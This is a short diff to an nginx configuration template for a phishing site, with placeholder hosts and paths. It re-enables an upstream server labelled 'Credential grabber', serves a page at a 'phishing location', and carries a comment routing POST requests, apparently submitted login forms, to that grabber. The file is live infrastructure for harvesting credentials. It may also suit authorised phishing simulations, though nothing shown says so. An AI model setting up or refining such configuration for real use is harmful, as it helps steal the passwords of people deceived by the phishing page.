@@ -1,7 +1,7 @@
 # Credential grabber upstream
 
 upstream grabber {
-	server <SERVER_HOST_IP (ex: 127.0.0.1:8080)> down;
+	server <SERVER_HOST_IP (ex: 127.0.0.1:8080)>;
 }
 
 # Redirect to HTTPS
@@ -31,7 +31,7 @@ server {
 
 	location <BASE_PHISHING_LOCATION (ex: /foo/bar/baz)> {
 		index index.html;
-		root <DOCUMENT_ROOT (ex: /var/www/html/mysite)>;
+		alias <DOCUMENT_ROOT (ex: /var/www/html/mysite)>;
 	}
 
 	# Route POST request to credential grabber
